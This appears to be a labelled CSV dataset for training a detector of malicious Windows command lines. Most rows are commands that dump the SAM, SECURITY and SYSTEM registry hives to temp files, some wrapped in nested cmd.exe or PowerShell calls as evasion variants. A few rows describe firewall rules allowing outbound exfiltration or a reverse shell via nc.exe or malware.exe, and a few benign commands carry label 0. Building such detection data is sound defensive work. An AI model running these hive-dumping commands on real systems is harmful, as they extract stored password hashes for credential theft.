text,label
reg export hklm\sam c:\windows\temp\ng3h6s4g.save,1
reg save hklm\system c:\windows\temp\hfw1z3wf.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ul1zbnir.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\j57ubchv.dat""",1
reg save hklm\security c:\windows\temp\sa30kmnk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\hwkrvbxo.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\l2y139r8.dat""",1
reg save hklm\sam c:\windows\temp\65q82caa.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\u01mls4j.dat""",1
reg save hklm\security c:\windows\temp\u6m9kemd.save,1
reg save hklm\system c:\windows\temp\4mv3hzdm.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\1z8a7uyy.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\7uepftom.dat""",1
reg export hklm\sam c:\windows\temp\4xqbati5.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\t2pe5l09.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\cu1ndkxu.dat""",1
reg save hklm\system c:\windows\temp\etaz6gj6.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\aws94k83.dat""",1
reg export hklm\system c:\windows\temp\z48ahd8g.save,1
reg save hklm\system c:\windows\temp\ibn80igt.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\9ngsemax.dat""",1
reg export hklm\system c:\windows\temp\0l18ko00.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\ciktbnhj.dat""""",1
reg export hklm\sam c:\windows\temp\kghbdjf4.save,1
reg export hklm\sam c:\windows\temp\49qs9wen.save,1
reg export hklm\system c:\windows\temp\es3qbyos.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\x3f9mzki.dat""",1
reg save hklm\sam c:\windows\temp\39z2npji.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ufqsmjm1.dat""",1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\ljac6c4g.save""",1
reg   save   hklm\sam   c:\windows\temp\iom7wzcr.save,1
reg export hklm\system c:\windows\temp\ut6jope9.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\sm6c9amh.dat""",1
reg export hklm\sam c:\windows\temp\y43nsj6f.save,1
reg export hklm\security c:\windows\temp\kd3f3utd.save,1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\bx8opgdh.dat""""",1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\vlcmlldw.dat""""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\4e1p2dvt.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\gpfsyqa1.dat""",1
reg  save  hklm\system  c:\windows\temp\i9u62z6c.save,1
reg export hklm\security c:\windows\temp\h6uuhccg.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\y1hbw05j.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6u9bgh6p.dat""",1
reg export hklm\security c:\windows\temp\m6qnjr0m.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\2k8dcars.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ejzj7pse.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\iae22pwz.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\r8ykjby2.dat""",1
reg save hklm\sam c:\windows\temp\zq96c44u.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\vm4y0wa4.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\t62znj9i.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\5ocfzsoc.dat""",1
reg export hklm\system c:\windows\temp\pfsyqa2e.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0b17749i.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u3ucwxir.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0ksee3oo.dat""",1
reg export hklm\security c:\windows\temp\wu37fkuo.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\8r3ti9bl.dat""",1
reg save hklm\system c:\windows\temp\kyc8p4g5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\qesjpgyo.dat""",1
reg save hklm\system c:\windows\temp\5qaohsyg.save,1
reg save hklm\security c:\windows\temp\s43lppxz.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\suhsfjeq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0tn9fhz3.dat""",1
reg export hklm\sam c:\windows\temp\4jie34iz.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\yl0ulozf.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\5qtidsq6.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\8a2w3pr4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rekmv9du.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8oia62ig.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wtr9gwur.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\y3rwomnu.dat""",1
reg export hklm\sam c:\windows\temp\5hh5ljdb.save,1
reg export hklm\sam c:\windows\temp\8bmr4vir.save,1
reg save hklm\system c:\windows\temp\4kldn5gf.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\eflwh7m1.dat""",1
reg save hklm\system c:\windows\temp\b61t9onr.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\6dmkoxsx.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ct3gl4x3.dat""",1
reg export hklm\sam c:\windows\temp\tkmmrcld.save,1
reg export hklm\system c:\windows\temp\0i7cwx6s.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\rh2wxeq0.dat""""",1
reg export hklm\system c:\windows\temp\h8x8devg.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\mb23qb52.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\mpmhxtol.dat""",1
reg export hklm\sam c:\windows\temp\qgiw4ywb.save,1
reg save hklm\system c:\windows\temp\ci2hgtol.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\kv5afc1v.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\x8a58r4f.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\whqy0xky.dat""",1
reg save hklm\sam c:\windows\temp\t2ypcei7.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\n50ic2rc.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rl6zvyzt.dat""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\rvedxju7.save""",1
reg export hklm\system c:\windows\temp\6mf2cb1y.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\q7eryzd3.dat""",1
reg export hklm\security c:\windows\temp\vjft4tm6.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8g890dw1.dat""",1
reg save hklm\sam c:\windows\temp\hpq7l4h9.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\fq6vv813.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\xjqt24hq.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\rua38sqn.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\vsssckkd.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\xmy5s1kh.dat""",1
reg  save  hklm\security  c:\windows\temp\18ay4c8h.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\e2r9em53.dat""",1
reg export hklm\security c:\windows\temp\cehsdyll.save,1
reg save hklm\sam c:\windows\temp\lb0953do.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fizfiqs1.dat""",1
reg export hklm\security c:\windows\temp\yjogaxus.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\fdz96qe2.dat""",1
reg save hklm\system c:\windows\temp\wqam6cro.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\hjusstpu.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\sh1l653n.dat""",1
reg save hklm\system c:\windows\temp\8o0a3dp2.save,1
reg  save  hklm\security  c:\windows\temp\b3p72a49.save,1
reg export hklm\sam c:\windows\temp\23xtv27y.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\wtfhwgvt.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\fj8gxxdd.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\j2ifsnyt.dat""",1
reg save hklm\security c:\windows\temp\3rgt4ksu.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\aisze03p.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\oehwm6up.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ra46zz94.dat""",1
reg save hklm\sam c:\windows\temp\y4xvxxzl.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\8fpsztwi.dat""",1
reg save hklm\system c:\windows\temp\55evi3lo.save,1
reg export hklm\security c:\windows\temp\e9022rgb.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\zqjuu67q.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ys2vh75e.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\7ul6hcqk.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\3orso7qt.dat""",1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\eflw6l5z.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\shjpkyzo.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\hh9j583m.dat""",1
reg export hklm\system c:\windows\temp\ws66s3q4.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\6z7oxn45.dat""",1
reg save hklm\system c:\windows\temp\yhkaihgg.save,1
reg export hklm\system c:\windows\temp\k4dt7ot5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\gcuudeh6.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ys1wp2sc.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\qsk8cddf.dat""",1
reg save hklm\sam c:\windows\temp\rsuo8scv.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\vjfgv8zd.dat""""",1
reg export hklm\sam c:\windows\temp\kz9g1gbu.save,1
reg export hklm\system c:\windows\temp\3ei9y4pi.save,1
reg export hklm\system c:\windows\temp\3eh9nxq6.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\u98hk2du.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\pm2lc883.dat""",1
reg save hklm\security c:\windows\temp\mckbndfo.save,1
"cmd.exe /c ""backup-utility   save   registry   config""",0
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\xa6wwkx6.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7069ud6u.dat""",1
reg export hklm\sam c:\windows\temp\zi2sob6h.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\qobiyz8p.dat""",1
reg export hklm\sam c:\windows\temp\h1o5pcvx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\fs69pye1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\qnp3sym9.dat""",1
reg export hklm\system c:\windows\temp\vmtaxcud.save,1
reg save hklm\sam c:\windows\temp\wblglokh.save,1
reg save hklm\security c:\windows\temp\qp0ti7sy.save,1
reg save hklm\security c:\windows\temp\9b3n2s6e.save,1
reg export hklm\sam c:\windows\temp\oy1einjz.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\w6aajp7z.dat""",1
reg save hklm\sam c:\windows\temp\ncunxlr1.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\s00p0jb3.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\q1qk2xrn.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\49qa86oc.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\zu130kc9.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\bvolkgew.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\cr3h4fgx.dat""",1
reg export hklm\system c:\windows\temp\81od7mky.save,1
reg export hklm\security c:\windows\temp\3rg9oshf.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\w1h41zw3.dat""",1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\s6aghk48.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7fu9yhxo.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\atircvxk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\nu89jrq0.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\yhpuybes.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\50xaitt1.dat""",1
reg save hklm\sam c:\windows\temp\li87zipi.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\icscytke.dat""",1
reg save hklm\security c:\windows\temp\bk8ypj87.save,1
"cmd.exe /c ""whoami /groups""",0
reg  save  hklm\sam  c:\windows\temp\fqf3pdlk.save,1
reg export hklm\system c:\windows\temp\mrfj2fn3.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\hsdumazr.dat""""",1
reg export hklm\security c:\windows\temp\lnogwic3.save,1
reg save hklm\system c:\windows\temp\ia2e08il.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\b6zzoic4.dat""""",1
reg export hklm\security c:\windows\temp\nugc4zyk.save,1
reg save hklm\security c:\windows\temp\o59kf4ap.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\4ujbf917.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\zy1ab13t.dat""",1
reg export hklm\sam c:\windows\temp\ege9pxry.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\wgis7q2q.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\ezd0movw.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\led302am.dat""",1
reg export hklm\sam c:\windows\temp\t0b3kae9.save,1
reg export hklm\sam c:\windows\temp\jmk35oke.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\5eumocg1.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kcicccqx.dat""",1
reg save hklm\system c:\windows\temp\u8k12z1r.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\eboy9bm2.dat""",1
reg export hklm\security c:\windows\temp\rumqjiiu.save,1
reg export hklm\sam c:\windows\temp\e5oa6rwa.save,1
reg export hklm\system c:\windows\temp\dvplb24n.save,1
reg save hklm\system c:\windows\temp\wud4hfth.save,1
reg save hklm\security c:\windows\temp\o0j8d35a.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\z2zf8dp1.dat""",1
reg save hklm\sam c:\windows\temp\a66wizaq.save,1
"powershell -nop -c ""netsh   dump   >   netconfig.txt""",0
reg   export   hklm\security   c:\windows\temp\q4h59lsz.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\f5uxdqpu.dat""",1
reg save hklm\security c:\windows\temp\rpt2t3xs.save,1
reg   save   hklm\sam   c:\windows\temp\78z9osu1.save,1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\7sijehk6.save""",1
reg export hklm\sam c:\windows\temp\di33tw3b.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\z1xlzzp3.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\cecgitdm.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\rfmvq462.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\q36yp3o7.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\135s66q9.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\9sy6mw1s.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\7mhn3v4j.dat""",1
reg export hklm\system c:\windows\temp\01ge5h4j.save,1
reg save hklm\security c:\windows\temp\lydc5nrl.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\logb4nzs.dat""",1
reg export hklm\sam c:\windows\temp\z7etqsqp.save,1
reg export hklm\sam c:\windows\temp\76r9bmmu.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\lw0t0shr.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\974z76et.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\fj1cqnyg.dat""",1
reg save hklm\sam c:\windows\temp\hqwch4rf.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\go6u0ai7.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\4atjejdk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u1lfpv9k.dat""",1
reg save hklm\sam c:\windows\temp\7goubs58.save,1
reg export hklm\system c:\windows\temp\peudv8pn.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\t1c6bml6.dat""",1
reg save hklm\sam c:\windows\temp\vh9cjai6.save,1
reg save hklm\security c:\windows\temp\t7fvsd55.save,1
reg export hklm\sam c:\windows\temp\f3tl43yi.save,1
reg export hklm\security c:\windows\temp\qc82nqzh.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\mai94jt7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\f3dx3s6x.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\b5a1lial.dat""",1
reg export hklm\sam c:\windows\temp\6e2h230g.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\r60eix1e.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\doyrbxy6.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\o4o09e2l.dat""",1
reg  export  hklm\security  c:\windows\temp\7u0rukqn.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\sy35b27t.dat""",1
reg export hklm\sam c:\windows\temp\xtnc9ctu.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\5inodr7w.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\qsp4hp29.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\mu984yn1.dat""",1
reg save hklm\system c:\windows\temp\bywri0ku.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\n8gja5cs.dat""",1
reg export hklm\security c:\windows\temp\7twcdmw6.save,1
reg export hklm\security c:\windows\temp\u1kg5h0e.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\nv0yei9k.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\msw182jq.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\r375lcx5.dat""",1
reg save hklm\sam c:\windows\temp\gxletsg3.save,1
reg save hklm\security c:\windows\temp\fxp4212n.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\gruuwk2p.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\7mgwvdym.dat""",1
reg save hklm\security c:\windows\temp\mdcl6y1s.save,1
reg save hklm\sam c:\windows\temp\9llonvvy.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\9yggu89o.dat""",1
reg save hklm\system c:\windows\temp\ed2de2ub.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\h9rcs9h0.dat""",1
reg save hklm\system c:\windows\temp\x6dyzqhz.save,1
reg export hklm\sam c:\windows\temp\2z57dgg9.save,1
reg save hklm\security c:\windows\temp\7s7cw2th.save,1
reg export hklm\system c:\windows\temp\bzlo44rl.save,1
reg   save   hklm\sam   c:\windows\temp\br8hu5lx.save,1
reg save hklm\sam c:\windows\temp\at3ceuzg.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\657y4nbb.dat""",1
reg export hklm\system c:\windows\temp\tg0w42wu.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\1ijhynjh.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\9i7q79ph.dat""",1
reg save hklm\security c:\windows\temp\jbemej5p.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\g13dkw6w.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\fiz5tus5.dat""",1
reg export hklm\system c:\windows\temp\yo3nuz8g.save,1
reg save hklm\sam c:\windows\temp\ul1lzxz5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8m4pnmta.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\bec6bfb1.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4wy7ukjs.dat""",1
reg save hklm\system c:\windows\temp\33j94tcf.save,1
reg save hklm\system c:\windows\temp\t1dvt5qy.save,1
reg export hklm\security c:\windows\temp\ge46klmb.save,1
reg save hklm\security c:\windows\temp\j606lc6k.save,1
reg export hklm\sam c:\windows\temp\dtppvdcb.save,1
reg save hklm\security c:\windows\temp\6lklirjh.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\u2e96ok6.dat""",1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg save hklm\security c:\temp\8q0u8cxb.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\st7lpe14.dat""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\vy69w0su.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9udq5in2.dat""",1
reg save hklm\sam c:\windows\temp\h1d7hi3k.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jqcm29mt.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ami3jytd.dat""",1
reg save hklm\security c:\windows\temp\wf12da4p.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\fo1aghn0.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\onu1rdbo.dat""",1
reg save hklm\sam c:\windows\temp\qjnlg78q.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\kw0tdgks.dat""",1
reg export hklm\security c:\windows\temp\i096yums.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\j47ayn8h.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\9r1iexcj.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\bes6v3tw.dat""",1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\q3jtsqsx.save""",1
reg save hklm\security c:\windows\temp\sdsc3hik.save,1
reg  save  hklm\sam  c:\windows\temp\76ged5fu.save,1
reg save hklm\security c:\windows\temp\3sc868ri.save,1
reg save hklm\security c:\windows\temp\j48h30q8.save,1
reg export hklm\system c:\windows\temp\mfcmgjtg.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\yu0g6xsr.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\a8im5hc7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\6j3e42zm.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\p6k76foz.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\iob2f8ju.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\3ba7x7g4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\puxuxr8t.dat""",1
reg export hklm\sam c:\windows\temp\hixppye4.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\oc93zv8y.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\izuybmqc.dat""",1
reg save hklm\security c:\windows\temp\bkzb5n60.save,1
reg export hklm\system c:\windows\temp\c46hqk2n.save,1
reg export hklm\sam c:\windows\temp\46dqueql.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\77mj4swt.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\iz1wxg6a.save""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\hh5yqbth.dat""""",1
reg   export   hklm\system   c:\windows\temp\sss265wi.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\38mcxuv4.dat""",1
reg export hklm\system c:\windows\temp\2qm61vaf.save,1
reg  save  hklm\system  c:\windows\temp\ll3d32pc.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\x0eki63q.save""",1
reg save hklm\security c:\windows\temp\5zt3tds2.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\p3fkdetw.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9djdhgwj.dat""",1
reg save hklm\system c:\windows\temp\7g0oeyg7.save,1
rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888,2
reg export hklm\security c:\windows\temp\7dsr0sk1.save,1
reg export hklm\system c:\windows\temp\tctslb1m.save,1
reg save hklm\sam c:\windows\temp\xzq65e8z.save,1
